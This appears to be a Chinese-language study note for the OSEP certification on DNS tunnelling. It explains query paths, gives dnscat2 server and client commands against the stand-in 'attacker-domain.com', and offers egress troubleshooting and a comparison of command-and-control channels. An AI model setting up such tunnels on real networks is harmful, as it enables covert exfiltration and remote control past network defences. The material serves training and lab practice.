# DNS 隧道去重与学习路线

## 这篇文档解决什么问题

当前网络过滤目录里已经有 DNS 过滤、DNS 隧道、出网受限决策树和排错手册。内容并不是要删除，而是要明确每个文件的用途，避免复习时在同一个知识点上来回跳。

## 初学者先理解 DNS 查询路径

### 正常 DNS 查询

```text
目标主机
  -> 内部 DNS 服务器
  -> 递归 DNS
  -> 根/TLD
  -> 你的域名权威 DNS
  -> 返回记录
```

DNS 隧道能成立，是因为目标环境允许 DNS 查询出去，且你能控制某个域名的权威 DNS。

### DNS 隧道查询

```text
目标主机把数据编码进子域名
  -> abc123.chunk.attacker-domain.com
  -> 查询到达你的权威 DNS / dnscat2 服务端
  -> 服务端从子域名里还原数据
  -> 通过 DNS 响应返回数据
```

它本质上是“把数据塞进 DNS 查询和响应”，所以速度慢、噪声明显、容易被频率和长度规则发现。

## 为什么 DNS 隧道不是默认首选

| 原因 | 说明 |
|---|---|
| 带宽低 | DNS 包小，传大文件慢 |
| 延迟高 | 查询/响应链路长 |
| 特征明显 | 长子域名、高频查询、异常 TXT 记录 |
| 配置要求高 | 需要域名、NS 记录、服务端 |
| 容易被限制 | 企业可能只允许内部 DNS，不允许任意外部递归 |

优先顺序通常是：

```text
正常 HTTPS 可出
  -> 解决代理感知和 TLS
  -> 仍失败再考虑域名前置/可信域名
  -> 只有 DNS 通、HTTP/HTTPS 不通时再考虑 DNS 隧道
```

## 正序学习路线

### 第 1 步：确认 DNS 基础

目标：能解释 A、NS、TXT、递归解析、权威 DNS。

练习命令：

```powershell
nslookup example.com
nslookup -type=NS example.com
Resolve-DnsName example.com
Resolve-DnsName -Type NS example.com
```

自测问题：

1. NS 记录和 A 记录有什么区别？
2. 为什么控制 NS 记录对 DNS 隧道重要？
3. 内部 DNS 和外部 DNS 的区别是什么？

### 第 2 步：判断目标网络是否允许 DNS 出网

```powershell
Resolve-DnsName example.com
nslookup example.com
nslookup example.com 8.8.8.8
```

判断：

| 现象 | 说明 |
|---|---|
| 内部 DNS 能解析外部域 | 可能允许递归 |
| 指定 8.8.8.8 失败 | 只允许内部 DNS |
| 某些域名失败 | 可能有 DNS 分类或过滤 |
| 服务端看不到查询 | 查询没有到达你的权威 DNS |

### 第 3 步：准备可控域名和服务端

需要：

- 一个授权实验域名。
- 一台 VPS 或实验服务端。
- NS 记录指向你的服务端。
- 防火墙允许 53/UDP，必要时 53/TCP。

检查：

```bash
dig NS attacker-domain.com
dig test.attacker-domain.com @your-vps-ip
```

### 第 4 步：最小 dnscat2 闭环

服务端：

```bash
ruby dnscat2.rb attacker-domain.com
```

客户端：

```bash
dnscat --dns domain=attacker-domain.com
```

先验证服务端能看到会话，再考虑命令执行、端口转发或文件传输。不要直接把 DNS 隧道当大文件通道。

### 第 5 步：观察流量特征

在实验环境抓包或查看 DNS 日志，观察：

| 特征 | 为什么重要 |
|---|---|
| 子域名长度 | 数据被编码进查询 |
| 查询频率 | 高频容易触发检测 |
| 查询类型 | TXT、NULL、A 等可能有不同表现 |
| 响应大小 | 大响应异常 |
| 失败率 | 过多 NXDOMAIN 可疑 |

## DNS 隧道失败排错

| 失败现象 | 优先排查 |
|---|---|
| 客户端启动但服务端无请求 | NS 记录、递归路径、防火墙、内部 DNS 限制 |
| 服务端有查询但无会话 | 域名参数、协议版本、查询类型、响应被拦 |
| 会话不稳定 | 丢包、查询频率、EDNS、UDP 分片 |
| 只能发不能收 | 响应被过滤、记录类型被限制 |
| 文件传输很慢 | DNS 带宽限制，改用小数据或转其他通道 |
| 很快被阻断 | 长域名、高频查询、信誉策略触发 |

---

## DNS 隧道与其他出网路线对比

| 路线 | 优点 | 缺点 | 适合场景 |
|---|---|---|---|
| 直连 HTTPS | 稳定、速度快 | 需要端口和 TLS 可用 | 大多数 C2/下载 |
| 代理感知 HTTPS | 贴近企业环境 | 代理认证复杂 | 浏览器能出、payload 不能出 |
| 域前置/可信域名 | 可借高信誉域名 | 现代限制多 | 环境允许特定域名 |
| DNS 隧道 | 只需 DNS 出口 | 慢、明显、配置复杂 | HTTP/HTTPS 被严格限制 |

## OSEP 相关重点

1. DNS 隧道是“出网受限时的备用路径”，不是默认通信方式。
2. 必须能解释 NS 记录和权威 DNS，否则排错会完全靠猜。
3. 服务端没有收到查询时，优先查 DNS 路径，不要反复换 payload。
4. DNS 隧道适合小命令、小数据、转发关键访问，不适合大文件搬运。
5. 报告里记录 DNS 解析、NS 配置、服务端查询、会话建立和限制。
